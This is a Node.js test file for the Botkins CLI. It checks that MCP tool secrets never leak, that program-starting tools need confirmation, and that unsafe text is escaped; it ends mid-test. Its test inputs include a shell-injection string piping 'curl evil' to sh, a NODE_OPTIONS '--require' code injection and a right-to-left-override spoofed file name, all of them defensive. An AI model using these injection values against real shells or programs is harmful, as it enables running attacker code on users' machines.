// Tools (MCP servers), skills, and a bot's tools, skills and access from the command line
// (cli/commands/tools.mjs), against a real service. What these hold to: a value is never a word
// on the command line and is never printed; a tool that starts a program is shown first and
// needs a yes; with no terminal a question fails and names its flag; a change is in the log.
import test from "node:test";
import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { createServer } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Readable, Writable } from "node:stream";
import { main } from "../cli/main.mjs";
import { readPersistedWorkspaceText } from "./starter.mjs";
import { shellWord } from "../cli/commands/tools.mjs";
import { terminalPaths } from "../desktop/terminal/paths.mjs";
import { startService } from "../desktop/terminal/serve.mjs";
import { controlClient } from "../desktop/terminal/socket.mjs";

const skip = process.platform === "win32" && "The terminal host runs on Linux and macOS.";
const freePort = () =>
  new Promise((resolve) => {
    const server = createServer();
    server.listen(0, "127.0.0.1", () => {
      const { port } = server.address();
      server.close(() => resolve(port));
    });
  });
/** A real service, and `botkins(argv, { input, tty })` to run a command against it. */
async function service(t) {
  const dir = mkdtempSync(join(tmpdir(), "bk-tools-"));
  const paths = terminalPaths({ root: join(dir, "r"), env: {} });
  mkdirSync(paths.root, { recursive: true });
  writeFileSync(paths.config, JSON.stringify({ link: { port: await freePort(), announce: false } }));
  const running = await startService({ paths, version: "9.9.9", trial: true });
  t.after(async () => {
    await running.stop("the test ended");
    rmSync(dir, { recursive: true, force: true });
  });
  const client = controlClient(paths.socket, { timeout: 40_000 });
  const botkins = async (argv, { input = "", tty = false } = {}) => {
    let out = "";
    let err = "";
    const stdin = Readable.from(input ? [input] : []);
    stdin.isTTY = tty;
    // (Real streams: a question at a terminal is asked through one.)
    const sink = (take) => new Writable({ write: (chunk, _encoding, done) => (take(String(chunk)), done()) });
    const exit = await main(argv, { stdout: sink((text) => void (out += text)), stderr: sink((text) => void (err += text)), stdin, env: {}, client });
    return { exit, out, err, json: () => JSON.parse(out) };
  };
  const put = (name, value) => {
    const path = join(dir, name);
    writeFileSync(path, typeof value === "string" ? value : JSON.stringify(value));
    return path;
  };
  const changes = async () => (await client.call("logs.read", { tail: 400 })).entries.map((entry) => entry.text).filter((text) => text.includes("Changed from the command line")).map((text) => text.split("Changed from the command line: ")[1]);
  const everything = () => [readPersistedWorkspaceText(paths.dataDir), readFileSync(paths.logFile, "utf8")].join("\n");
  return { dir, paths, client, botkins, put, changes, everything, running };
}
const SECRET = "sk-VALUE-that-must-not-show";

test("a tool that starts a program is shown first and needs a yes; its values go in by a file and never come out", { skip }, async (t) => {
  const { botkins, put, client, everything, running } = await service(t);
  // A test connects to the tool itself: a stand-in for the program, which can't be reached.
  const started = [];
  running.runtime.workspace.mcpApps.connect = (server) => ({
    tools: async () => (started.push([server.command, ...server.args].join(" ")), Promise.reject(new Error("not reachable"))),
    close: async () => {},
  });
  // The program's own arguments come after "--", so that one may start with a dash.
  const add = (...more) => ["tools", "add", "files", "--command", "npx", "--env", "API_KEY", ...more, "--", "-y", "@example/files server"];
  // With no terminal there is nobody to ask: the command shows what would run, fails, and names the flag.
  const asked = await botkins(add());
  assert.equal(asked.exit, 2);
  assert.match(asked.err, /^This starts a program on this computer, as the user that runs Botkins:\n {2}files: npx -y "@example\/files server"\n {6}with the environment values API_KEY\nThe program is found on the PATH of the service/);
  assert.match(asked.err, /This needs a yes\. Run it again with --yes\./);
  // With the yes and no value: the same for the value, and still nothing is added.
  const noValue = await botkins(add("--yes"));
  assert.equal(noValue.exit, 2);
  assert.match(noValue.err, /A value is needed for API_KEY\. Give them in a JSON file with --secrets <path>, or --secrets - to read it from standard input\. A value is never a word on the command line\./);
  assert.deepEqual((await botkins(["tools", "list", "--json"])).json(), []);
  // The value in a file; the line that runs is printed even with --yes.
  const added = await botkins(add("--yes", "--secrets", put("values.json", { env: { API_KEY: SECRET } })));
  assert.equal(added.exit, 0, added.err);
  assert.match(added.err, /npx -y "@example\/files server"/);
  assert.match(added.out, /^Added files\. Every bot has it now/);
  const [tool] = (await botkins(["tools", "list", "--json"])).json();
  assert.deepEqual([tool.name, tool.kind, tool.enabled, tool.runs, tool.env, tool.headers], ["files", "command", true, ["npx", "-y", "@example/files server"], ["API_KEY"], []]);
  // The names of its values are shown. The value is nowhere: not in an answer, not in the workspace's file, not in the log.
  const show = await botkins(["tools", "show", "files"]);
  assert.match(show.out, /Starts: npx -y "@example\/files server"\nEnvironment values: API_KEY/);
  for (const text of [show.out, added.out, added.err, JSON.stringify(await client.call("tools.list")), everything()]) assert.equal(text.includes(SECRET), false);
  // The values from standard input, and one asked for at a terminal without being shown.
  const piped = await botkins(["tools", "add", "second", "--command", "node", "--env", "TOKEN", "--yes", "--secrets", "-"], { input: JSON.stringify({ env: { TOKEN: SECRET } }) });
  assert.equal(piped.exit, 0, piped.err);
  const typed = await botkins(["tools", "add", "third", "--command", "node", "--env", "TOKEN", "--yes"], { input: SECRET + "\n", tty: true });
  assert.equal(typed.exit, 0, typed.err);
  assert.equal((typed.out + typed.err).includes(SECRET), false);
  assert.equal((await botkins(["tools", "add", "broken", "--command", "node", "--env", "TOKEN", "--yes", "--secrets", put("other.json", { env: { OTHER: "x" } })])).exit, 2, "a file with a value for another name and none for this one");

  // Changing what it starts: shown and asked again, and the stored value must be given again, because it would go somewhere new.
  const moved = (...more) => ["tools", "edit", "files", ...more, "--", "-y", "@example/other"];
  assert.equal((await botkins(moved())).exit, 2);
  const kept = await botkins(moved("--yes"));
  assert.equal(kept.exit, 1);
  assert.match(kept.err, /Enter the value for API_KEY again\. You changed where this server sends it\./);
  const again = await botkins(moved("--yes", "--env", "API_KEY", "--secrets", put("values2.json", { env: { API_KEY: SECRET + "2" } })));
  assert.equal(again.exit, 0, again.err);
  assert.match(again.err, /npx -y @example\/other/);
  // A change that starts nothing new asks nothing: a new name. A value taken away changes what the program gets, so it asks.
  assert.equal((await botkins(["tools", "edit", "files", "--name", "docs"])).exit, 0);
  assert.equal((await botkins(["tools", "edit", "docs", "--remove-env", "API_KEY"])).exit, 2);
  assert.equal((await botkins(["tools", "edit", "docs", "--remove-env", "API_KEY", "--yes"])).exit, 0);
  assert.deepEqual((await botkins(["tools", "show", "docs", "--json"])).json().env, []);
  assert.equal((await botkins(["tools", "edit", "docs"])).exit, 2, "nothing to change");
  assert.equal((await botkins(["tools", "edit", "docs", "--url", "https://example.com/mcp"])).exit, 2, "a program has no web address");

  // Off needs no question; on does, for a program.
  assert.match((await botkins(["tools", "disable", "docs"])).out, /docs is off\./);
  assert.equal((await botkins(["tools", "enable", "docs"])).exit, 2);
  assert.match((await botkins(["tools", "enable", "docs", "--yes"])).out, /docs is on\./);
  // A test starts it, and says so. A tool that doesn't answer fails the command.
  const tried = await botkins(["tools", "test", "docs"]);
  assert.match(tried.err, /Starting: npx -y @example\/other/);
  assert.match(tried.out, /docs: failed/);
  assert.equal(tried.exit, 1);
  assert.deepEqual(started, ["npx -y @example/other"]);
  // One that is off is shown and asked for, as when it is switched on: a test starts it too.
  await botkins(["tools", "disable", "docs"]);
  const offTest = await botkins(["tools", "test", "docs"]);
  assert.equal(offTest.exit, 2);
  assert.match(offTest.err, /This starts a program on this computer[\s\S]*docs: npx -y @example\/other[\s\S]*This needs a yes/);
  assert.match((await botkins(["tools", "test", "docs", "--yes"])).out, /docs: failed/);
  assert.equal(started.length, 2, "with the yes it is started");
  await botkins(["tools", "enable", "docs", "--yes"]);
  // Removing asks too. The socket's own call refuses with no mark, and the tool is still there; with the mark it goes.
  assert.equal((await botkins(["tools", "remove", "docs"])).exit, 2);
  await assert.rejects(client.call("tools.remove", "docs"), { code: "NEEDS_YES" });
  assert.ok((await client.call("tools.list")).some((tool) => tool.name === "docs"));
  assert.match((await botkins(["tools", "remove", "docs", "--yes"])).out, /Removed docs\./);
  assert.match((await botkins(["tools", "show", "docs"])).err, /There is no tool called docs\. See `botkins tools list`\./);
  assert.equal(everything().includes(SECRET), false);
});

test("a tool on the web takes its header by name, and a file of tools is shown before it is added", { skip }, async (t) => {
  const { botkins, put, client, changes, everything } = await service(t);
  // A web address starts nothing here: no question.
  const web = await botkins(["tools", "add", "search", "--url", "https://mcp.example.com/v1", "--header", "Authorization", "--secrets", "-"], { input: JSON.stringify({ headers: { Authorization: "Bearer " + SECRET } }) });
  assert.equal(web.exit, 0, web.err);
  const shown = (await botkins(["tools", "show", "search", "--json"])).json();
  assert.deepEqual([shown.kind, shown.url, shown.headers, shown.auth.type, "runs" in shown], ["web", "https://mcp.example.com/v1", ["Authorization"], "header", false]);
  assert.equal((await botkins(["tools", "add", "both", "--url", "https://x.example", "--command", "npx"])).exit, 2);
  assert.equal((await botkins(["tools", "add", "mixed", "--url", "https://x.example", "--env", "A"])).exit, 2);
  assert.equal((await botkins(["tools", "add", "neither"])).exit, 2);
  // A new address needs the header's value again; with it, the change is saved.
  assert.match((await botkins(["tools", "edit", "search", "--url", "https://other.example.com/v1"])).err, /Enter the value for Authorization again/);
  assert.equal((await botkins(["tools", "edit", "search", "--url", "https://other.example.com/v1", "--header", "Authorization", "--secrets", put("h.json", { headers: { Authorization: "Bearer " + SECRET } })])).exit, 0);
  // Signing in needs a browser; signing out does not.
  // Signing out forgets the sign-in: the socket refuses with no mark, the command needs a yes.
  await assert.rejects(client.call("tools.signOut", "search"), { code: "NEEDS_YES" });
  assert.equal((await botkins(["tools", "sign-out", "search"])).exit, 2);
  assert.equal((await botkins(["tools", "sign-out", "search", "--yes"])).exit, 0);

  // A file of tools: each program is shown, one yes for all, and a name that is taken is left out.
  const file = put("mcp.json", { mcpServers: { search: { url: "https://dup.example.com" }, notes: { command: "uvx", args: ["notes-mcp", "--dir", "/srv/notes"], env: { NOTES_KEY: SECRET } }, remote: { url: "https://remote.example.com/mcp" } } });
  const asked = await botkins(["tools", "import", file]);
  assert.equal(asked.exit, 2);
  // Every tool of the file is listed, a web address too, and the question counts what was listed.
  assert.match(asked.err, /^This file adds these 2 tools:\n {2}notes: uvx notes-mcp --dir \/srv\/notes\n {6}with the environment values NOTES_KEY\n {2}remote: reaches https:\/\/remote\.example\.com\/mcp\nOne of them starts a program on this computer, as the user that runs Botkins\. [^\n]*\nLeft out, because the name is taken: search\.\n/);
  assert.deepEqual((await botkins(["tools", "list", "--json"])).json().map((tool) => tool.name), ["search"]);
  const done = await botkins(["tools", "import", file, "--yes"]);
  assert.match(done.out, /Added notes, remote\. Left out: search \(the name is taken, or the limit of 50 tools is reached\)\./);
  assert.deepEqual((await botkins(["tools", "show", "notes", "--json"])).json().env, ["NOTES_KEY"]);
  assert.equal((await botkins(["tools", "import", put("bad.json", "{")])).exit, 1);
  // A file of only web tools is shown and asked for too: it also puts something on this computer's bots.
  const webOnly = JSON.stringify({ servers: { piped: { url: "https://piped.example.com", headers: { "X-Key": SECRET } } } });
  const webAsked = await botkins(["tools", "import", "-"], { input: webOnly });
  assert.equal(webAsked.exit, 2);
  assert.match(webAsked.err, /^This file adds this tool:\n {2}piped: reaches https:\/\/piped\.example\.com\/\n {6}with the headers X-Key\n/);
  assert.equal(webAsked.err.includes(SECRET), false);
  assert.equal((await botkins(["tools", "import", "-", "--yes"], { input: webOnly })).exit, 0);
  // Nothing new in the file: nothing is asked.
  assert.match((await botkins(["tools", "import", "-"], { input: webOnly })).out, /Nothing to add: each name in the file is taken \(piped\)\./);
  assert.equal((await botkins(["tools", "forget-approvals"])).exit, 0);

  // Each change is in the log by its call and its thing. No value is.
  assert.deepEqual(await changes(), ["tools.add search", "tools.edit search", "tools.signOut search", "tools.import notes, remote", "tools.import piped", "tools.forgetApprovals every chat"]);
  assert.equal(everything().includes(SECRET), false);
});

test("skills are added, changed, turned off and removed, and one bot's tools and skills are its own", { skip }, async (t) => {
  const { botkins, put, client } = await service(t);
  assert.match((await botkins(["skills", "add", "weekly-report", "--description", "Use for the Friday report.", "--instructions-file", put("report.md", "# Weekly report\n\nList what shipped.")])).out, /^Added weekly-report\./);
  assert.equal((await botkins(["skills", "add", "from-pipe", "--description", "Use when asked.", "--instructions-file", "-"], { input: "Do it." })).exit, 0);
  assert.equal((await botkins(["skills", "add", "none", "--description", "x"])).exit, 2);
  assert.match((await botkins(["skills", "add", "!!!", "--description", "x", "--instructions", "y"])).err, /Name the skill with letters, numbers and dashes\./);
  const list = (await botkins(["skills", "list", "--json"])).json();
  assert.deepEqual(list.skills.filter((skill) => skill.origin === "botkins").map((skill) => [skill.name, skill.enabled]).sort(), [["from-pipe", true], ["weekly-report", true]]);
  assert.match((await botkins(["skills", "show", "weekly-report"])).out, /weekly-report\nUse for the Friday report\.\n\n# Weekly report\n\nList what shipped\./);
  // A change keeps what is not named.
  assert.equal((await botkins(["skills", "edit", "weekly-report", "--description", "Use for the Monday report."])).exit, 0);
  const edited = (await botkins(["skills", "show", "weekly-report", "--json"])).json();
  assert.deepEqual([edited.description, edited.instructions], ["Use for the Monday report.", "# Weekly report\n\nList what shipped."]);
  assert.equal((await botkins(["skills", "edit", "weekly-report"])).exit, 2);
  // The skill that comes with Botkins is not one to edit here, and says where it is.
  assert.match((await botkins(["skills", "edit", "today-panel", "--description", "x"])).err, /today-panel is not a skill that Botkins keeps\. Change it in its folder: /);
  assert.match((await botkins(["skills", "disable", "weekly-report"])).out, /weekly-report is off\./);
  assert.match((await botkins(["skills", "enable", "weekly-report"])).out, /weekly-report is on\./);
  // A folder outside the person's home folder is not one to choose, in the app's own words.
  assert.match((await botkins(["skills", "add-folder", "/etc"])).err, /Only folders in your home folder or on a plugged-in disk can be chosen from here/);
  assert.match((await botkins(["skills", "folders"])).out, /No folders are linked/);
  assert.equal((await botkins(["skills", "remove-folder", "nope"])).exit, 1);
  assert.equal(typeof (await botkins(["folders", "--json"])).json().path, "string");

  // One bot's own: a tool and a skill taken from it, and given back.
  await client.call("bots.add", { name: "Nova" });
  await client.call("bots.add", { name: "Orbit" });
  await botkins(["tools", "add", "search", "--url", "https://mcp.example.com/v1"]);
  const off = (await botkins(["bots", "tools", "Nova", "--off", "search", "--json"])).json();
  assert.deepEqual(off.tools.map((tool) => [tool.name, tool.on]), [["search", false]]);
  assert.deepEqual((await botkins(["bots", "tools", "Orbit", "--json"])).json().tools.map((tool) => [tool.name, tool.on]), [["search", true]], "the other bot keeps it");
  const skills = (await botkins(["bots", "skills", "Nova", "--off", "weekly-report", "--off", "from-pipe", "--json"])).json();
  assert.deepEqual(skills.skills.filter((skill) => !skill.on).map((skill) => skill.name).sort(), ["from-pipe", "weekly-report"]);
  assert.deepEqual(skills.tools.map((tool) => tool.on), [false], "a change to the skills leaves the tools as they were");
  const back = (await botkins(["bots", "skills", "Nova", "--on", "from-pipe", "--json"])).json();
  assert.deepEqual(back.skills.filter((skill) => !skill.on).map((skill) => skill.name), ["weekly-report"]);
  assert.match((await botkins(["bots", "tools", "Nova", "--off", "nothing"])).err, /There is no tool called nothing/);
  assert.match((await botkins(["bots", "tools", "Nova"])).out, /search +off +on/);
  // Removing a skill takes it from every bot's list too.
  assert.equal((await botkins(["skills", "remove", "weekly-report"])).exit, 2);
  assert.match((await botkins(["skills", "remove", "weekly-report", "--yes"])).out, /Removed weekly-report\./);
  assert.equal((await botkins(["bots", "skills", "Nova", "--json"])).json().skills.some((skill) => skill.name === "weekly-report"), false);
  // Which projects a bot may use.
  assert.match((await botkins(["bots", "access", "Nova", "--all"])).out, /Nova may use every project\./);
  assert.deepEqual((({ all, projects }) => [all, projects])((await botkins(["bots", "access", "Nova", "--none", "--json"])).json()), [false, []]);
  assert.equal((await botkins(["bots", "access", "Nova", "--all", "--none"])).exit, 2);
  assert.match((await botkins(["bots", "access", "Nova", "--project", "Nowhere"])).err, /There is no project called Nowhere\./);
});

test("the question cannot be skipped by a program's own words, and what will start is shown with --json too", { skip }, async (t) => {
  const { botkins, put, changes, client } = await service(t);
  const listed = async () => (await client.call("tools.list")).map((tool) => tool.name);
  // "-y" is npx's own. It is no short form of --yes, here or after "--".
  const habit = await botkins(["tools", "add", "files", "--command", "npx", "-y", "@example/files"]);
  assert.equal(habit.exit, 2);
  assert.match(habit.err, /Unknown option '-y'/);
  const after = await botkins(["tools", "add", "files", "--command", "npx", "--", "-y", "@example/files"]);
  assert.equal(after.exit, 2);
  assert.match(after.err, /files: npx -y @example\/files\n[\s\S]*This needs a yes/);
  // A word after "--" is the program's, never Botkins' own: no help, no version, no JSON mode, and the tool is saved with it.
  for (const word of ["--help", "-h", "--version", "-V", "--json", "--yes"]) {
    const run = await botkins(["tools", "add", "t" + word.replace(/-/g, ""), "--command", "node", "--yes", "--", "server.js", word]);
    assert.equal(run.exit, 0, word + ": " + run.err);
    assert.match(run.out, /^Added /, word);
    assert.deepEqual((await client.call("tools.get", "t" + word.replace(/-/g, ""))).runs, ["node", "server.js", word]);
  }
  assert.equal((await botkins(["tools", "add", "noyes", "--command", "node", "--", "server.js", "--yes"])).exit, 2, "a --yes after -- is the program's");
  assert.equal((await listed()).includes("noyes"), false);

  // With --json the block is still on standard error, and the answer says what starts.
  const added = await botkins(["tools", "add", "jsonned", "--command", "uvx", "--cwd", "/srv/app", "--env", "API_KEY", "--json", "--yes", "--secrets", put("v.json", { env: { API_KEY: SECRET } }), "--", "srv"]);
  assert.equal(added.exit, 0, added.err);
  assert.match(added.err, /^This starts a program on this computer, as the user that runs Botkins:\n {2}jsonned: uvx srv\n {6}in the folder "\/srv\/app"\n {6}with the environment values API_KEY\n/);
  assert.deepEqual((({ runs, cwd, env }) => [runs, cwd, env])(added.json()), [["uvx", "srv"], "/srv/app", ["API_KEY"]]);
  await botkins(["tools", "disable", "jsonned"]);
  const on = await botkins(["tools", "enable", "jsonned", "--json", "--yes"]);
  assert.match(on.err, /jsonned: uvx srv\n {6}in the folder "\/srv\/app"\n {6}with the environment values API_KEY/);
  assert.deepEqual((({ enabled, runs, cwd, env }) => [enabled, runs, cwd, env])(on.json()), [true, ["uvx", "srv"], "/srv/app", ["API_KEY"]]);
  assert.equal((await botkins(["tools", "enable", "jsonned", "--json"])).exit, 0, "one that is on already asks nothing");
  const file = put("m.json", { mcpServers: { imported: { command: "node", args: ["a.js"], cwd: "./server", env: { K: SECRET } }, web: { url: "https://w.example.com" } } });
  const imported = await botkins(["tools", "import", file, "--json", "--yes"]);
  assert.match(imported.err, /imported: node a\.js\n {6}in the folder "[^"]*\/server"\n {6}with the environment values K\n {2}web: reaches https:\/\/w\.example\.com\//);
  const answer = imported.json();
  assert.deepEqual([answer.added, answer.starts.map((entry) => [entry.name, entry.runs, entry.env])], [["imported", "web"], [["imported", ["node", "a.js"], ["K"]]]]);
  assert.match(answer.starts[0].cwd, /\/server$/, "a folder beside the file is that folder");

  // An edit of only environment values changes what runs: it is shown, with every name, and asked for.
  const env = ["tools", "edit", "jsonned", "--env", "NODE_OPTIONS"];
  const asked = await botkins([...env, "--secrets", put("n.json", { env: { NODE_OPTIONS: "--require /tmp/x.js" } })]);
  assert.equal(asked.exit, 2);
  assert.match(asked.err, /jsonned: uvx srv\n {6}in the folder "\/srv\/app"\n {6}with the environment values API_KEY, NODE_OPTIONS\n[\s\S]*This needs a yes/);
  assert.deepEqual((await client.call("tools.get", "jsonned")).env, ["API_KEY"]);
  assert.equal((await botkins([...env, "--yes", "--secrets", put("n.json", { env: { NODE_OPTIONS: "--require /tmp/x.js" } })])).exit, 0);
  const gone = await botkins(["tools", "edit", "jsonned", "--remove-env", "API_KEY"]);
  assert.equal(gone.exit, 2);
  assert.match(gone.err, /with the environment values NODE_OPTIONS\n/);
  // The log names each tool, also when the command gave its id, and each import's tools.
  const lines = await changes();
  for (const line of ["tools.add jsonned", "tools.enable jsonned", "tools.import imported, web", "tools.edit jsonned"]) assert.ok(lines.includes(line), line + " in " + JSON.stringify(lines));
});

test("a name is a name: a word with a value in it is refused before anything is asked, echoed or saved", { skip }, async (t) => {
  const { botkins, put, client, everything } = await service(t);
  const bad = [
    ["--env", "API_KEY=" + SECRET],
    ["--env", SECRET + " "],
    ["--env", "9LIVES"],
    ["--env", "A B"],
  ];
  for (const [flag, word] of bad) {
    for (const input of [{}, { input: "typed\n", tty: true }]) {
      const run = await botkins(["tools", "add", "leak", "--command", "node", "--yes", flag, word], input);
      assert.equal(run.exit, 2, word);
      assert.match(run.err, /--env takes a name only, such as API_KEY\. The value is never a word on the command line/);
      assert.equal((run.out + run.err).includes(SECRET), false, "the word is not repeated");
    }
  }
  for (const word of ["Authorization: Bearer " + SECRET, "X-Key=" + SECRET, "Bad Name", ""]) {
    const run = await botkins(["tools", "add", "leak", "--url", "https://x.example.com", "--header", word, "--secrets", put("s.json", { headers: {} })]);
    assert.equal(run.exit, 2, word);
    assert.match(run.err, /--header takes a name only, such as Authorization\./);
    assert.equal((run.out + run.err).includes(SECRET), false);
  }
  // The same in an edit, and in the app's own save, which a caller reaches without the command.
  await botkins(["tools", "add", "ok", "--url", "https://x.example.com"]);
  assert.equal((await botkins(["tools", "edit", "ok", "--header", "Authorization: Bearer " + SECRET])).exit, 2);
  await assert.rejects(client.call("tools.add", { name: "direct", url: "https://x.example.com", headers: { ["Authorization: Bearer " + SECRET]: "v" } }), /A header is given by its name only, such as Authorization\./);
  await assert.rejects(client.call("tools.add", { name: "direct", command: "node", env: { ["API_KEY=" + SECRET]: "v" } }, { agreed: true }), (error) => !error.message.includes(SECRET));
  assert.deepEqual((await client.call("tools.list")).map((tool) => tool.name), ["ok"]);
  assert.equal(everything().includes(SECRET), false);

  // The secrets file: an object in the form, with a value for each name and for no other.
  const add = (file, more = []) => botkins(["tools", "add", "s", "--command", "node", "--yes", "--env", "TOKEN", ...more, "--secrets", file]);
  for (const text of ["null", '"a string"', "[]", "7", '{"env":"TOKEN"}', '{"env":{"TOKEN":7}}', '{"values":{"TOKEN":"x"}}', "{"]) {
    const run = await add(put("bad.json", text));
    assert.equal(run.exit, 2, text + ": " + run.err);
    assert.match(run.err, /The secrets are not in the form \{ "env": \{ "NAME": "value" \}, "headers"/);
  }
  const extra = await add(put("extra.json", { env: { TOKEN: "a", OTHER: SECRET }, headers: { H: SECRET } }));
  assert.equal(extra.exit, 2);
  assert.match(extra.err, /The secrets hold 2 values that this command did not name\./);
  assert.equal(extra.err.includes(SECRET), false);
  assert.equal((await add(put("none.json", { env: {} }))).exit, 1, "no value for the name");
  assert.equal((await client.call("tools.list")).some((tool) => tool.name === "s"), false);

  // Text that would change what a person sees is written as numbers, and such a folder is not saved.
  const odd = await botkins(["tools", "add", "odd", "--command", "node", "--", "a\u001b[2Kb", "\u202Egnp.exe"]);
  assert.match(odd.err, /odd: node "a\\\\u\{1b\}\[2Kb" "\\\\u\{202e\}gnp\.exe"/);
  assert.equal(/[\u001b\u202e]/.test(odd.err), false);
  const cwd = await botkins(["tools", "add", "odd", "--command", "node", "--cwd", "/srv/a\rb", "--yes"]);
  assert.equal(cwd.exit, 1);
  assert.match(cwd.err, /in the folder "\/srv\/a\\\\u\{d\}b"[\s\S]*The working folder's path has characters that can't be shown\./);
  // U+200C and U+200D are correct writing in some languages, and a person there has folders with them: such a path is
  // saved. Where it is shown for a decision, the character is written as its number.
  const joiner = await botkins(["tools", "add", "joiner", "--command", "node", "--cwd", "/srv/a\u200cb", "--yes"]);
  assert.equal(joiner.exit, 0, joiner.err);
  assert.match(joiner.err, /in the folder "\/srv\/a\\\\u\{200c\}b"/);
  assert.equal(joiner.err.includes("\u200c"), false);
});

test("a folder that is a plugin is not taken as a folder of skills, and two skills of one name are not guessed between", { skip }, async (t) => {
  const { botkins, client, dir, changes, paths, running } = await service(t);
  const { homedir } = await import("node:os");
  const { mkdtempSync: temp, rmSync: remove } = await import("node:fs");
  // The folders that can be chosen are in the home folder of the user that runs the service.
  const home = temp(join(homedir(), ".botkins-test-"));
  t.after(() => remove(home, { recursive: true, force: true }));
  const make = (name, files) => {
    const folder = join(home, name);
    mkdirSync(folder, { recursive: true });
    for (const [file, text] of Object.entries(files)) {
      mkdirSync(join(folder, file, ".."), { recursive: true });
      writeFileSync(join(folder, file), text);
    }
    return folder;
  };
  // (Through the command, a folder must first be one that can be chosen; `skills add-folder /etc` in another test is refused there.)
  // The rule itself, as the command reaches it: a plugin folder is refused; a folder with a SKILL.md is a skill, also beside a plugin's file.
  const { Workspace } = await import("./starter.mjs");
  const { fakeClient } = await import("./fake-copilot.mjs");
  const ws = new Workspace(join(dir, "ws"), fakeClient().client, () => {});
  const plugin = make("a-plugin", { "plugin.json": JSON.stringify({ name: "a-plugin" }), "hooks/hooks.json": "{}" });
  assert.throws(() => ws.integrations.addFromFolder(plugin, { plugins: false }), /This folder is a plugin, which can run commands on this computer\. It is not added as a folder of skills\./);
  assert.deepEqual(ws.integrations.folders().plugins, []);
  assert.deepEqual(ws.integrations.addFromFolder(make("both", { "SKILL.md": "---\nname: both\ndescription: A skill.\n---\nDo it.", "plugin.json": "{}" }), { plugins: false }), { kind: "skill", name: "both" });
  // No caller links a plugin folder any more. The app's own call (the window and a phone use it) sends the folder
  // the plugins' way: it is copied, described and added switched on (the window and the phone warn first), and the answer says so.
  assert.throws(() => ws.integrations.addFromFolder(plugin), (error) => error.code === "PLUGIN_FOLDER");
  // (A trial service lets a caller choose folders below its own home folder only.)
  const hooked = join(paths.dataDir, "folders-home", "hooked");
  mkdirSync(join(hooked, "hooks"), { recursive: true });
  writeFileSync(join(hooked, "plugin.json"), JSON.stringify({ name: "hooked" }));
  writeFileSync(join(hooked, "hooks", "hooks.json"), JSON.stringify({ hooks: { sessionStart: [{ command: "touch /tmp/hooked" }] } }));
  // (The socket has no way to the app's raw call: `call` is not a method of the service.)
  await assert.rejects(client.call("call", "addSkillFolderAt", [hooked]), { code: "UNKNOWN_METHOD" });
  const sent = await running.runtime.handlers.addSkillFolderAt(hooked);
  assert.deepEqual([sent.kind, sent.name, sent.enabled], ["plugin", "hooked", true]);
  const [installed] = await client.call("plugins.list");
  assert.deepEqual([installed.id, installed.enabled, installed.contents.hooks.map((hook) => hook.command)], [sent.id, true, ["touch /tmp/hooked"]]);
  // The command for skills still refuses it, with the same sentence.
  const refused = await botkins(["skills", "add-folder", hooked]);
  assert.equal(refused.exit, 1);
  assert.match(refused.err, /This folder is a plugin, which can run commands on this computer\. It is not added as a folder of skills\./);
  // A relative path is the folder it names from where the command runs; the log has the path.
  const relative = await botkins(["skills", "add-folder", "no-such-folder-here"]);
  assert.equal(relative.exit, 1);
  assert.match(relative.err, /That folder doesn't exist on the computer\.|Only folders in your home folder/);
  // Two skills whose names differ only by capitals: the exact name is that one, and another spelling is not guessed.
  const real = client.call.bind(client);
  await botkins(["skills", "add", "report", "--description", "d", "--instructions", "i"]);
  assert.equal((await real("skills.get", "report")).name, "report");
  assert.equal((await real("skills.get", "REPORT")).name, "report", "one match, whatever its capitals");
  assert.deepEqual((await changes()).filter((line) => line.startsWith("skills.")), ["skills.save report"]);
});

/** The command line against a stand-in client that answers each call with a fixed value. */
async function fake(answers, argv) {
  let out = "";
  let err = "";
  const stdin = Readable.from([]);
  stdin.isTTY = false;
  const sink = (take) => new Writable({ write: (chunk, _encoding, done) => (take(String(chunk)), done()) });
  const client = { call: async (name) => (name in answers ? answers[name] : Promise.reject(new Error("unexpected call " + name))) };
  const exit = await main(argv, { stdout: sink((text) => void (out += text)), stderr: sink((text) => void (err += text)), stdin, env: {}, client });
  return { exit, out, err };
}

test("the socket's own calls refuse a change that starts a program unless the caller marks that it agreed", { skip }, async (t) => {
  const { client, botkins, put } = await service(t);
  const refused = /needs a yes|starts a program on this computer/;
  const file = JSON.stringify({ mcpServers: { local: { command: "node", args: ["a.js"] } } });
  // Nothing that starts a program goes in with no mark: not an add, not an import.
  await assert.rejects(client.call("tools.add", { name: "prog", command: "node", args: ["a.js"] }), refused);
  await assert.rejects(client.call("tools.import", file), refused);
  assert.deepEqual(await client.call("tools.list"), []);
  // With the mark it goes in. A web address needs none.
  assert.equal((await client.call("tools.add", { name: "prog", command: "node", args: ["a.js"] }, { agreed: true })).kind, "command");
  assert.equal((await client.call("tools.add", { name: "site", url: "https://x.example.com" })).kind, "web");
  // A change of what runs needs it; a change of the name or a switch off does not; a switch on needs it again.
  await assert.rejects(client.call("tools.edit", "prog", { args: ["b.js"] }), refused);
  await assert.rejects(client.call("tools.edit", "prog", { env: { NODE_OPTIONS: "x" } }), refused);
  assert.equal((await client.call("tools.edit", "prog", { name: "renamed" })).name, "renamed");
  assert.equal((await client.call("tools.edit", "renamed", { args: ["b.js"] }, { agreed: true })).runs[1], "b.js");
  assert.equal((await client.call("tools.enable", "renamed", false)).enabled, false);
  await assert.rejects(client.call("tools.enable", "renamed", true), refused);
  await assert.rejects(client.call("tools.test", "renamed"), refused);
  assert.equal((await client.call("tools.enable", "renamed", true, { agreed: true })).enabled, true);
  // The command line sends the mark only after the yes.
  assert.equal((await botkins(["tools", "add", "viaCli", "--command", "node", "--yes"])).exit, 0);
  assert.equal((await botkins(["tools", "import", put("f.json", JSON.stringify({ mcpServers: { more: { command: "node" } } })), "--yes"])).exit, 0);
});

test("a word of a command that Botkins prints for someone to run is quoted for a shell, and a word that cannot be written has no runnable form", { skip }, async () => {
  const turn = String.fromCodePoint(0x202e);
  // The rule itself: plain words stay, any other word is in single quotes, a quote is '\'' , nothing runnable for a word that turns text.
  assert.equal(shellWord("memory@test-market"), "memory@test-market");
  assert.equal(shellWord("--bot=Nova"), "--bot=Nova");
  assert.equal(shellWord("a;curl evil|sh;#@x"), "'a;curl evil|sh;#@x'");
  assert.equal(shellWord("a$(x)`y`"), "'a$(x)`y`'");
  assert.equal(shellWord("it's"), "'it'\\''s'");
  assert.equal(shellWord("a b"), "'a b'");
  assert.equal(shellWord(""), "''");
  assert.equal(shellWord("a" + turn + "b", "<its id>"), "<its id>");
